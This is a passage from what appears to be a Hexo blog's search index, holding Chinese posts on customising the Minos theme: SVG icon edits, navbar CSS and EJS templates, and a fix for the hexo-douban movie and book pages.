752.76c-6.84 0-13.04-4.67-14.69-11.62-1.93-8.12 3.08-16.27 11.2-18.2 44.48-10.59 77.46-37.1 92.86-74.65 15.08-36.78 10.9-78.42-11.49-114.24-4.42-7.08-2.27-16.4 4.81-20.83 7.08-4.42 16.4-2.27 20.83 4.81 13.6 21.75 21.99 46.27 24.27 70.91 2.24 24.21-1.37 48.7-10.44 70.82-9.2 22.44-23.45 41.83-42.36 57.64-19.89 16.63-43.93 28.39-71.46 34.94-1.2 0.28-2.38 0.42-3.53 0.42z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3890&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M809.25 752.76c-1.16 0-2.34-0.13-3.51-0.41-27.53-6.56-51.58-18.31-71.46-34.94-18.91-15.81-33.16-35.2-42.36-57.64-9.07-22.12-12.69-46.61-10.44-70.82 2.28-24.64 10.67-49.16 24.27-70.91 4.42-7.08 13.75-9.23 20.83-4.81 7.08 4.42 9.23 13.75 4.81 20.83-22.39 35.82-26.58 77.46-11.49 114.24 15.4 37.54 48.38 64.05 92.86 74.65 8.12 1.93 13.14 10.08 11.2 18.2-1.67 6.93-7.87 11.61-14.71 11.61z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3891&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M746.32 675.74c-2.85 0-5.74-0.81-8.3-2.5-6.97-4.59-8.9-13.97-4.3-20.94 19.16-29.08 28.87-64.42 28.87-105.03 0-52.31-15.95-102.42-46.13-144.92-4.83-6.81-3.23-16.24 3.57-21.07 6.8-4.83 16.24-3.24 21.07 3.57 33.83 47.64 51.71 103.8 51.71 162.42 0 46.63-11.39 87.56-33.86 121.66-2.9 4.42-7.72 6.81-12.63 6.81zM683.29 359.27c-3.44 0-6.9-1.17-9.74-3.57-25.33-21.38-54.1-37.29-85.52-47.28-7.96-2.53-12.35-11.03-9.82-18.98 2.53-7.95 11.03-12.35 18.98-9.82 35.23 11.2 67.48 29.03 95.85 52.99 6.38 5.38 7.18 14.92 1.8 21.3a15.113 15.113 0 0 1-11.55 5.36zM253.82 499.41c-1.18 0-2.38-0.14-3.58-0.43-8.11-1.97-13.09-10.15-11.12-18.26 14.61-60.08 49.44-114.51 98.08-153.24 24.32-19.37 51.44-34.45 80.61-44.83 30.18-10.74 61.87-16.19 94.19-16.19 8.35 0 15.11 6.77 15.11 15.11s-6.77 15.11-15.11 15.11c-57.31 0-111.24 18.83-155.96 54.44-43.42 34.57-74.51 83.13-87.54 136.73-1.68 6.92-7.87 11.56-14.68 11.56zM257.86 635.44c-6.26 0-12.11-3.92-14.28-10.16-8.23-23.71-12.4-49.95-12.4-78 0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11c0 24.66 3.61 47.57 10.73 68.09 2.74 7.89-1.44 16.5-9.33 19.23-1.62 0.57-3.29 0.84-4.94 0.84zM512 775.3c-72.91 0-136.67-15.89-184.39-45.95-7.06-4.45-9.18-13.78-4.73-20.84 4.45-7.06 13.78-9.18 20.84-4.73 42.88 27.02 101.07 41.29 168.27 41.29 49.91 0 94.33-7.7 132-22.9 7.74-3.12 16.55 0.62 19.67 8.36 3.12 7.74-0.62 16.55-8.36 19.67-41.28 16.66-89.49 25.1-143.3 25.1z&quot; fill=&quot;#996930&quot; p-id=&quot;3892&quot;&gt;&lt;/path&gt;&lt;/svg&gt; 修改class=&quot;icon&quot; 为 class=&quot;bi bi-award&quot; 修改width=&quot;200&quot; height=&quot;200&quot; 为 width=&quot;140&quot; height=&quot;140&quot; 修改后的代码： 1&lt;svg t=&quot;1586079277539&quot; class=&quot;bi bi-award&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;3878&quot; width=&quot;100&quot; height=&quot;100&quot;&gt;&lt;path d=&quot;M471.7 959.31h-40.3c-8.35 0-15.11-6.77-15.11-15.11 0-19.45 15.82-35.27 35.27-35.27h5.04v-55.42c0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11v90.68c-0.01 8.35-6.78 15.12-15.12 15.12zM592.61 959.31h-40.3c-8.35 0-15.11-6.77-15.11-15.11v-89.16c0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11v53.89h5.04c19.45 0 35.27 15.82 35.27 35.27-0.01 8.34-6.77 15.11-15.12 15.11z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3879&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M777.7 547.27c0 146.74-118.96 212.91-265.7 212.91s-265.7-66.17-265.7-212.91 118.96-265.7 265.7-265.7 265.7 118.96 265.7 265.7z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3880&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M616.22 195.02c-17.51-5.03-29.28-20.42-29.28-38.29 0-41.67-32.99-76.17-73.54-76.91-20.37-0.34-39.44 7.25-53.9 21.45-14.47 14.21-22.44 33.2-22.44 53.47v1.99c0 17.87-11.76 33.26-29.28 38.29-160.3 46.09-272.25 194.85-272.25 361.76 0 98.48 38.75 178.65 112.08 231.85 65.66 47.64 157.09 72.82 264.39 72.82s198.72-25.18 264.39-72.82c73.32-53.19 112.08-133.37 112.08-231.85-0.01-166.91-111.96-315.67-272.25-361.76zM512 760.18c-146.74 0-265.7-66.17-265.7-212.91s118.96-265.7 265.7-265.7 265.7 118.96 265.7 265.7S658.74 760.18 512 760.18z&quot; fill=&quot;#B2D868&quot; opacity=&quot;.6&quot; p-id=&quot;3881&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M511.54 602.97c-13.01 0-26.55-5.35-37.05-15.84-5.9-5.9-5.9-15.47 0-21.37s15.47-5.9 21.37 0c7.65 7.65 18.88 9.36 24.52 3.72 5.63-5.63 3.93-16.84-3.7-24.49-5.89-5.9-5.89-15.45 0-21.35 7.63-7.65 9.33-18.87 3.7-24.49-5.64-5.64-16.86-3.93-24.52 3.72-5.9 5.9-15.47 5.9-21.37 0s-5.9-15.47 0-21.37c19.57-19.57 49.75-21.24 67.27-3.72 14.55 14.55 15.86 37.85 4.66 56.54 11.2 18.69 9.89 41.99-4.66 56.54-8.13 8.11-18.97 12.11-30.22 12.11z&quot; fill=&quot;#FF4E00&quot; p-id=&quot;3882&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M428.87 505.89H393.6c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM428.87 546.19H393.6c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM630.39 505.89h-35.27c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11zM630.39 546.19h-35.27c-8.35 0-15.11-6.77-15.11-15.11s6.77-15.11 15.11-15.11h35.27c8.35 0 15.11 6.77 15.11 15.11s-6.76 15.11-15.11 15.11z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3883&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M321.89 614c9.73 0 9.74-15.11 0-15.11-9.73 0-9.75 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3884&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M370.42 581.87c9.73 0 9.74-15.11 0-15.11-9.72 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3885&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M415.54 617.42c9.73 0 9.74-15.11 0-15.11-9.72 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3886&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M609.69 612.63c9.73 0 9.74-15.11 0-15.11-9.73 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3887&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M657.54 570.93c9.73 0 9.74-15.11 0-15.11-9.73 0-9.74 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3888&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M704.03 607.85c9.73 0 9.74-15.11 0-15.11-9.73-0.01-9.75 15.11 0 15.11z&quot; fill=&quot;#FF6464&quot; opacity=&quot;.5&quot; p-id=&quot;3889&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M214.75 752.76c-6.84 0-13.04-4.67-14.69-11.62-1.93-8.12 3.08-16.27 11.2-18.2 44.48-10.59 77.46-37.1 92.86-74.65 15.08-36.78 10.9-78.42-11.49-114.24-4.42-7.08-2.27-16.4 4.81-20.83 7.08-4.42 16.4-2.27 20.83 4.81 13.6 21.75 21.99 46.27 24.27 70.91 2.24 24.21-1.37 48.7-10.44 70.82-9.2 22.44-23.45 41.83-42.36 57.64-19.89 16.63-43.93 28.39-71.46 34.94-1.2 0.28-2.38 0.42-3.53 0.42z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3890&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M809.25 752.76c-1.16 0-2.34-0.13-3.51-0.41-27.53-6.56-51.58-18.31-71.46-34.94-18.91-15.81-33.16-35.2-42.36-57.64-9.07-22.12-12.69-46.61-10.44-70.82 2.28-24.64 10.67-49.16 24.27-70.91 4.42-7.08 13.75-9.23 20.83-4.81 7.08 4.42 9.23 13.75 4.81 20.83-22.39 35.82-26.58 77.46-11.49 114.24 15.4 37.54 48.38 64.05 92.86 74.65 8.12 1.93 13.14 10.08 11.2 18.2-1.67 6.93-7.87 11.61-14.71 11.61z&quot; fill=&quot;#3F2704&quot; p-id=&quot;3891&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M746.32 675.74c-2.85 0-5.74-0.81-8.3-2.5-6.97-4.59-8.9-13.97-4.3-20.94 19.16-29.08 28.87-64.42 28.87-105.03 0-52.31-15.95-102.42-46.13-144.92-4.83-6.81-3.23-16.24 3.57-21.07 6.8-4.83 16.24-3.24 21.07 3.57 33.83 47.64 51.71 103.8 51.71 162.42 0 46.63-11.39 87.56-33.86 121.66-2.9 4.42-7.72 6.81-12.63 6.81zM683.29 359.27c-3.44 0-6.9-1.17-9.74-3.57-25.33-21.38-54.1-37.29-85.52-47.28-7.96-2.53-12.35-11.03-9.82-18.98 2.53-7.95 11.03-12.35 18.98-9.82 35.23 11.2 67.48 29.03 95.85 52.99 6.38 5.38 7.18 14.92 1.8 21.3a15.113 15.113 0 0 1-11.55 5.36zM253.82 499.41c-1.18 0-2.38-0.14-3.58-0.43-8.11-1.97-13.09-10.15-11.12-18.26 14.61-60.08 49.44-114.51 98.08-153.24 24.32-19.37 51.44-34.45 80.61-44.83 30.18-10.74 61.87-16.19 94.19-16.19 8.35 0 15.11 6.77 15.11 15.11s-6.77 15.11-15.11 15.11c-57.31 0-111.24 18.83-155.96 54.44-43.42 34.57-74.51 83.13-87.54 136.73-1.68 6.92-7.87 11.56-14.68 11.56zM257.86 635.44c-6.26 0-12.11-3.92-14.28-10.16-8.23-23.71-12.4-49.95-12.4-78 0-8.35 6.77-15.11 15.11-15.11s15.11 6.77 15.11 15.11c0 24.66 3.61 47.57 10.73 68.09 2.74 7.89-1.44 16.5-9.33 19.23-1.62 0.57-3.29 0.84-4.94 0.84zM512 775.3c-72.91 0-136.67-15.89-184.39-45.95-7.06-4.45-9.18-13.78-4.73-20.84 4.45-7.06 13.78-9.18 20.84-4.73 42.88 27.02 101.07 41.29 168.27 41.29 49.91 0 94.33-7.7 132-22.9 7.74-3.12 16.55 0.62 19.67 8.36 3.12 7.74-0.62 16.55-8.36 19.67-41.28 16.66-89.49 25.1-143.3 25.1z&quot; fill=&quot;#996930&quot; p-id=&quot;3892&quot;&gt;&lt;/path&gt;&lt;/svg&gt; 原图：修改后：","link":"/2020/04/07/booboo_hexo/2020-04-07-tec-hexo/"},{"title":"Minos主题修改导航栏","text":"摘要：在模版minos的基础上，定制一些自己的前端需求。 修改导航栏当前：居中显示与文章部分同宽 800px 我的期望： 导航1200px 文章1100px logo占1个格子 分类占10个格子 链接占1个格子 修改CSS配置minos/layout/source/css/style.css 1234567891011121314151617@media screen and (min-width: 1024px) { .container { max-width: 1100px; width: 1100px; } //新增 .navbar-container { max-width: 1200px; width: 1200px; margin-left: 10.333%; } //新增 .navbar.is-transparent .navbar-dropdown a.navbar-item:hover { color: #3273dc; }} 修改minos/layout/layout/common/navbar.ejs，添加以下代码 12345678910111213&lt;div class=&quot;navbar-container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-1&quot;&gt; &lt;!--左侧只占一个格子 --&gt; &lt;/div&gt; &lt;div class=&quot;col-md-10&quot;&gt; &lt;!--中间自适应 --&gt; &lt;/div&gt; &lt;div class=&quot;col-md-1&quot;&gt; &lt;!--最右侧 --&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 最终代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153&lt;% function is_same_link(a, b) { function santize(url) { let paths = url.replace(/(^\\w+:|^)\\/\\//, &apos;&apos;).split(&apos;#&apos;)[0].split(&apos;/&apos;); if (paths.length &gt; 0 &amp;&amp; paths[paths.length - 1].trim() === &apos;index.html&apos;) { paths = paths.slice(0, paths.length - 1) } return paths.join(&apos;/&apos;); } return santize(url_for(a)) == santize(url_for(b));} %&gt;&lt;nav class=&quot;navbar is-transparent is-fixed-top navbar-main&quot; role=&quot;navigation&quot; aria-label=&quot;main navigation&quot;&gt; &lt;div class=&quot;navbar-container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;!--左侧只占一个格子 --&gt; &lt;div class=&quot;col-md-1&quot;&gt; &lt;div class=&quot;navbar-brand&quot;&gt; &lt;a class=&quot;navbar-item navbar-logo&quot; href=&quot;&lt;%- url_for(&apos;/&apos; + (!is_default_language(page_language()) ? page_language() : &apos;&apos;)) %&gt;&quot;&gt; &lt;% if (has_config(&apos;logo&apos;) &amp;&amp; get_config(&apos;logo&apos;)) { %&gt; &lt;% if (has_config(&apos;logo.text&apos;) &amp;&amp; get_config(&apos;logo.text&apos;)) { %&gt; &lt;%= get_config(&apos;logo.text&apos;) %&gt; &lt;% } else { %&gt; &lt;img src=&quot;&lt;%- url_for(get_config(&apos;logo&apos;)) %&gt;&quot; alt=&quot;&quot; height=&quot;28&quot;&gt; &lt;% } %&gt; &lt;% } else { %&gt; &lt;img src=&quot;&lt;%- url_for(&apos;images/logo.png&apos;) %&gt;&quot; alt=&quot;&quot; height=&quot;28&quot;&gt; &lt;% } %&gt; &lt;/a&gt; &lt;div class=&quot;navbar-burger&quot;&gt; &lt;span&gt; &lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--中间自适应 --&gt; &lt;div class=&quot;col-md-10&quot;&gt; &lt;% if (has_config(&apos;menu&apos;)) { %&gt; &lt;div class=&quot;navbar-menu navbar-start&quot;&gt; &lt;% for (let i in get_config(&apos;menu&apos;)) { let menu = get_config(&apos;menu&apos;)[i]; %&gt; &lt;a class=&quot;navbar-item &lt;% if (typeof(page.path) !== &apos;undefined&apos; &amp;&amp; is_same_link(menu, page.path)) { %&gt;is-active&lt;% } %&gt;&quot; href=&quot;&lt;%- url_for(menu) %&gt;&quot;&gt;&lt;%= i %&gt;&lt;/a&gt; &lt;% } %&gt; &lt;!-- BoobooWei自动根据已有的category创建--&gt; &lt;% var childCategory = {}; site.categories.forEach(function (category) { if (category.parent) { if (childCategory[category.parent]) { childCategory[category.parent].push(category); } else { childCategory[category.parent] = [category]; } } }) %&gt; &lt;nav class=&quot;navbar navbar-expand-lg navbar-light&quot;&gt; &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarSupportedContent&quot; aria-controls=&quot;navbarSupportedContent&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt; &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarSupportedContent&quot;&gt; &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt; &lt;!--循环category 生成navbar代码--&gt; &lt;% site.categories.forEach(function(category){ %&gt; &lt;% if(!category.parent) { %&gt; &lt;li class=&quot;nav-item dropdown&quot;&gt;&lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#ff&quot; role=&quot;button&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot; id=&quot;&lt;%=category.name%&gt;&quot;&gt;&lt;% if (childCategory[category._id]) {%&gt;&lt;i class=&quot;fold iconfont icon-right&quot;&gt;&lt;/i&gt;&lt;% } %&gt;&lt;%=category.name%&gt;&lt;/a&gt; &lt;% if (childCategory[category._id]) {%&gt; &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;&lt;%=category.name%&gt;&quot;&gt; &lt;% childCategory[category._id].forEach(function (child) { %&gt; &lt;a class=&quot;dropdown-item&quot; href=&quot;&lt;%=url_for(child.path)%&gt;&quot; data-rel=&quot;&lt;%=child.name%&gt;&quot;&gt;&lt;% if (childCategory[child._id]) {%&gt;&lt;i class=&quot;fold iconfont icon-right&quot;&gt;&lt;/i&gt;&lt;% } %&gt;&lt;%=child.name%&gt;&lt;/a&gt; &lt;% if (childCategory[child._id]) {%&gt; &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;&lt;%=category.name%&gt;&quot;&gt; &lt;% childCategory[child._id].forEach(function (child2) { %&gt; &lt;a class=&quot;dropdown-item&quot; href=&quot;&lt;%=url_for(child2.path)%&gt;&quot; data-rel=&quot;&lt;%=child.name%&gt;&quot;&gt; data-rel=&quot;&lt;%=child2.name%&gt;&quot;&gt;&lt;% if (childCategory[child2._id]) {%&gt;&lt;i class=&quot;fold iconfont icon-right&quot;&gt;&lt;/i&gt;&lt;% } %&gt;&lt;%=child2.name%&gt;&lt;/a&gt; &lt;% }) %&gt; &lt;/div&gt; &lt;% } %&gt; &lt;% }) %&gt; &lt;/div&gt; &lt;/li&gt; &lt;% } %&gt; &lt;% } else { %&gt; &lt;% } %&gt; &lt;% }) %&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;!-- 自动根据已有的category创建--&gt; &lt;/div&gt; &lt;% } %&gt; &lt;/div&gt; &lt;!--最右侧 --&gt; &lt;div class=&quot;col-md-1&quot;&gt; &lt;div class=&quot;navbar-menu navbar-end&quot;&gt; &lt;% if (has_config(&apos;search&apos;)) { %&gt; &lt;a class=&quot;navbar-item search&quot; title=&quot;&lt;%= __(&apos;nav.search&apos;) %&gt;&quot; href=&quot;javascript:;&quot;&gt; &lt;i class=&quot;fas fa-search&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;% } %&gt; &lt;% if (has_config(&apos;toc&apos;) &amp;&amp; get_config(&apos;toc&apos;) === true &amp;&amp; typeof(page.content) !== &apos;undefined&apos;) { %&gt; &lt;div class=&quot;navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc&quot;&gt; &lt;a class=&quot;navbar-item&quot; title=&quot;&lt;%= __(&apos;nav.toc&apos;) %&gt;&quot;&gt; &lt;i class=&quot;fa fa-list&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;div class=&quot;navbar-dropdown is-right&quot;&gt; &lt;% let lastHeading = null; %&gt; &lt;% for (let heading of toc_list(page.content)) { %&gt; &lt;% if (lastHeading !== null &amp;&amp; heading[0].split(&apos;.&apos;)[0] !== lastHeading) { %&gt; &lt;hr class=&quot;navbar-divider&quot;&gt; &lt;% } %&gt; &lt;% lastHeading = heading[0].split(&apos;.&apos;)[0]; %&gt; &lt;a class=&quot;navbar-item&quot; href=&quot;#&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;).replace(/ /g,&apos;-&apos;) %&gt;&quot;&gt;&lt;%= heading[0] %&gt;&amp;nbsp;&amp;nbsp;&lt;%- heading[3] === 1 ? &apos;&lt;b&gt;&apos; : &apos;&apos; %&gt;&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;) %&gt;&lt;%- heading[3] === 1 ? &apos;&lt;/b&gt;&apos; : &apos;&apos; %&gt;&lt;/a&gt; &lt;% } %&gt; &lt;/div&gt; &lt;/div&gt; &lt;% } %&gt; &lt;% if (has_config(&apos;navbar_links&apos;)) { for (let name in get_config(&apos;navbar_links&apos;)) { let link = get_config(&apos;navbar_links&apos;)[name]; %&gt; &lt;a class=&quot;navbar-item&quot; title=&quot;&lt;%= name %&gt;&quot; href=&quot;&lt;%= typeof(link) === &apos;string&apos; ? link : link.url%&gt;&quot;&gt; &lt;% if (typeof(link) === &apos;string&apos;) { %&gt; &lt;%= name %&gt; &lt;% } else { %&gt; &lt;i class=&quot;&lt;%= link.icon %&gt;&quot;&gt;&lt;/i&gt; &lt;% } %&gt; &lt;/a&gt; &lt;% } %&gt; &lt;% } %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/nav&gt;","link":"/2020/04/06/booboo_hexo/2020-04-06-tec-hexo/"},{"title":"Minos主题开发喜爱的电影和读书页面","text":"摘要：在模版minos的基础上，定制一些自己的前端需求。 开发喜爱的电影页面我的期望：设计一个自己喜爱的电影和书籍主页 解决方法： 导航栏目添加 电影和读书 按钮 开发页面 效果图先看效果图 添加电影按钮修改页面 minos/layout/common/navbar.ejs代码如下： 123456&lt;a class=&quot;navbar-item&quot; title=&quot;movie&quot; href=&quot;/books/&quot;&gt; &lt;svg t=&quot;1586350091188&quot; class=&quot;icon&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;2280&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;path d=&quot;M306.4 773.3h188v16.3c0 13.8 11.2 25 25 25s25-11.2 25-25v-16.3h180.5c68.9 0 125-56.1 125-125V295.4c0-68.9-56.1-125-125-125H549.6c-10.7 0-19.9 6.8-23.4 16.3-2.1-0.6-4.4-0.9-6.7-0.9-2 0-3.9 0.2-5.8 0.7-3.6-9.4-12.7-16-23.3-16h-184c-68.9 0-125 56.1-125 125v352.9c0 68.8 56.1 124.9 125 124.9z m418.5-552.9c41.4 0 75 33.6 75 75v352.9c0 41.4-33.6 75-75 75H544.4V219.9c1.7 0.4 3.4 0.5 5.2 0.5h175.3z m-493.5 75c0-41.4 33.6-75 75-75h183.9c1.4 0 2.8-0.1 4.1-0.3v503.2h-188c-41.4 0-75-33.6-75-75V295.4z&quot; p-id=&quot;2281&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M901.5 314.3c-11 0-20 9-20 20v384c0 44.1-35.9 80-80 80H615.3c-5.6 0-11 2.4-14.8 6.5l-25.9 28.4c-2 2.2-4.9 3.5-7.9 3.5H459c-2.9 0-5.6-1.1-7.6-3.1L425.8 808c-3.8-3.8-8.8-5.9-14.1-5.9H224.8c-44.1 0-80-35.9-80-80V343.9c0-11-9-20-20-20s-20 9-20 20v378.3c0 66.2 53.8 120 120 120h178.5l19.7 19.7c9.6 9.6 22.3 14.9 35.9 14.9h107.7c14.2 0 27.9-6 37.5-16.5l20-21.9h177.4c66.2 0 120-53.8 120-120v-384c0-11.1-9-20.1-20-20.1z&quot; p-id=&quot;2282&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M297.5 341.4h123.6c11 0 20-9 20-20s-9-20-20-20H297.5c-11 0-20 9-20 20s8.9 20 20 20zM297.5 408.6h123.6c11 0 20-9 20-20s-9-20-20-20H297.5c-11 0-20 9-20 20s8.9 20 20 20zM297.5 506.5h123.6c11 0 20-9 20-20s-9-20-20-20H297.5c-11 0-20 9-20 20s8.9 20 20 20z&quot; p-id=&quot;2283&quot;&gt;&lt;/path&gt;&lt;/svg&gt; &lt;/a&gt;&lt;/a&gt;&lt;a class=&quot;navbar-item&quot; title=&quot;movie&quot; href=&quot;/movies/&quot;&gt; &lt;svg t=&quot;1586342683221&quot; class=&quot;bi bi-award&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;1766&quot; width=&quot;20&quot; height=&quot;20&quot;&gt;&lt;path d=&quot;M914.044 898.826H109.956c-20.435 0-37-16.565-37-37V280.131c0-20.435 16.565-37 37-37h804.088c20.435 0 37 16.565 37 37v581.695c0 20.435-16.565 37-37 37z m-767.088-74h730.088V317.131H146.956v507.695zM322.739 199.174H113c-20.435 0-37-16.565-37-37s16.565-37 37-37h209.739c20.435 0 37 16.565 37 37s-16.565 37-37 37z&quot; p-id=&quot;1767&quot; fill=&quot;#2c2c2c&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M457.932 752.856A37.002 37.002 0 0 1 420.937 716l-1.122-287.64a37.003 37.003 0 0 1 20.769-33.395 37.006 37.006 0 0 1 39.104 4.167l184.107 144.792a37 37 0 0 1-0.105 58.248L480.704 745.021a36.982 36.982 0 0 1-22.772 7.835z m36.181-248.234l0.528 135.641 86.29-67.361-86.818-68.28z&quot; p-id=&quot;1768&quot; fill=&quot;#2c2c2c&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; navbar.ejs 安装豆瓣组件Hexo 加入豆瓣组件 1npm install hexo-douban --save 遇到的问题：主题minos在生成文章时，会存在 14 分钟 读完 (约 2031 字) 的统计，导致插件无法正常生成index.html页面。 代码如下minos/layout/commont/article.ejs： 123456789101112131415&lt;% if (post.categories &amp;&amp; post.categories.length){ %&gt;&lt;span class=&quot;column is-narrow article-category&quot;&gt; &lt;i class=&quot;far fa-folder&quot;&gt;&lt;/i&gt; &lt;%- (post._categories || post.categories).map(category =&gt; `&lt;a class=&quot;article-category-link&quot; href=&quot;${url_for(category.path)}&quot;&gt;${category.name}&lt;/a&gt;`) .join(&apos;&lt;span&gt;&gt;&lt;/span&gt;&apos;) %&gt;&lt;/span&gt;&lt;% } %&gt;&lt;% if (!has_config(&apos;article.readtime&apos;) || get_config(&apos;article.readtime&apos;) === true) { %&gt;&lt;span class=&quot;column is-narrow&quot;&gt; &lt;% let words = word_count(post._content); %&gt; &lt;% let time = duration((words / 150.0) * 60, &apos;seconds&apos;) %&gt; &lt;%= `${ time.humanize() } ${ __(&apos;article.read&apos;)} (${ __(&apos;article.about&apos;) } ${ words } ${ __(&apos;article.words&apos;) })` %&gt;&lt;/span&gt;&lt;% } %&gt; 解决方法1解决方法1：修改minos模版artile.ejs。 优点-简单，且无需修改豆瓣插件的代码。 缺点-豆瓣插件的页面不是自己想要的，希望可以再优化。 12345678910111213141516&lt;% if (post.categories &amp;&amp; post.categories.length){ %&gt;&lt;span class=&quot;column is-narrow article-category&quot;&gt; &lt;i class=&quot;far fa-folder&quot;&gt;&lt;/i&gt; &lt;%- (post._categories || post.categories).map(category =&gt; `&lt;a class=&quot;article-category-link&quot; href=&quot;${url_for(category.path)}&quot;&gt;${category.name}&lt;/a&gt;`) .join(&apos;&lt;span&gt;&gt;&lt;/span&gt;&apos;) %&gt;&lt;/span&gt; &lt;% if (!has_config(&apos;article.readtime&apos;) || get_config(&apos;article.readtime&apos;) === true) { %&gt; &lt;span class=&quot;column is-narrow&quot;&gt; &lt;% let words = word_count(post._content); %&gt; &lt;% let time = duration((words / 150.0) * 60, &apos;seconds&apos;) %&gt; &lt;%= `${ time.humanize() } ${ __(&apos;article.read&apos;)} (${ __(&apos;article.about&apos;) } ${ words } ${ __(&apos;article.words&apos;) })` %&gt; &lt;/span&gt; &lt;% } %&gt;&lt;% } %&gt; 解决方法2解决方法2：修改豆瓣插件代码，修改渲染的ejs文件；并定制渲染页面。 1 修改三个js文件，修改layout: [&apos;page&apos;, &apos;post&apos;] 为 layout: [&apos;page&apos;, &apos;post-douban&apos;] 123408:19 PM :MyBlog booboowei$ ll node_modules/hexo-douban/lib/*-generator.js-rw-r--r-- 1 booboowei staff 5.1K Apr 8 20:14 node_modules/hexo-douban/lib/books-generator.js-rw-r--r-- 1 booboowei staff 4.9K Apr 8 20:14 node_modules/hexo-douban/lib/games-generator.js-rw-r--r-- 1 booboowei staff 5.0K Apr 8 20:14 node_modules/hexo-douban/lib/movies-generator.js2 创建themes/minos/layout/post-douban.ejs 12345&lt;section class=&quot;section&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;%- partial(&apos;common/douban&apos;, { post: page, index: false }) %&gt; &lt;/div&gt;&lt;/section&gt; 3 创建themes/minos/layout/common/douban.ejs","link":"/2020/04/08/booboo_hexo/2020-04-08-tec-hexo/"},{"title":"关于博客中技术文章的思考","text":"摘要：工作中的技术积累，需要沉淀，选择一个好的方式很重要，并且需要长期的坚持，这是一个技术者的 自我学习与沉淀的能力。 2020年之前所有的学习记录均存放在Github中维护，优点：非常方便内容的迭代；缺点：不方便分享。 计划： 从基础系列开始将已成体系的学习内容输出至博客，未成体系的内容继续在Github中迭代。 技术文档中，非markdown文件使用github原有仓库来保存，通过链接的方式到博客。 